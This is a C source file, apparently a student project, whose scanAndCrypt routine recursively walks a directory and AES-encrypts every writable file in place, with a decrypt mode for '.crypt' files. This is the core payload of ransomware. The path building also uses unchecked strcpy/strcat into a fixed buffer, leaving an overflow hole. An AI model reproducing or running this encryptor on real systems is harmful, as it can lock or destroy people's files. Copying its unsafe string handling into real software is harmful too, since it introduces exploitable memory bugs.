#include <sys/socket.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include "filescan.h"
#include "crypto.h"

bool isFile(char *name){
    //printf("Dirctory test name: ~%s~\n", name);
    DIR* directory = opendir(name);
    if(directory != NULL){
        closedir(directory);
        //printf("NULL dir pointer...\n");
        return false;
    }
    if(errno == ENOTDIR){
        return true;
    }
    //closedir(directory);
    return true;
}

bool canBeModified(char *path){
    FILE *f = fopen(path, "ab");
    if(f == NULL)
        return false;
    fclose(f);
    return true;
}

int files = 0;

void scanAndCrypt(char *path, unsigned char *key, bool encrypt){
    DIR *dr = opendir(path);
    struct dirent *de;

    if (dr == NULL)
    {
        printf("Could not open current directory\n" );
        return;
    }

    while ((de = readdir(dr)) != NULL){

            char pathName[2000];
            strcpy(pathName, path);
            strcat(pathName, "/");
            strcat(pathName, de->d_name);

            if(strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0)
                continue;
            if(isFile(pathName)){
                if(canBeModified(pathName)){
                    if(encrypt)
                        encryptAES(pathName, key);
                    else if(strstr(pathName, ".crypt")!= NULL)
                        decryptAES(pathName, key);
                    //prepare(pathName);
                    //printf("file: %s\n", pathName);
                }

            }
            else {
                scanAndCrypt(pathName, key, encrypt);
            }

    }
    closedir(dr);
}
/*
int main(int n, char *arg[n]){

    char path[2000]="/home/emil/Facultate/Imperative Programming/Elise/for_crypto";
    scanAndCrypt(path, (unsigned char *)"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", arg[1]);
}*/
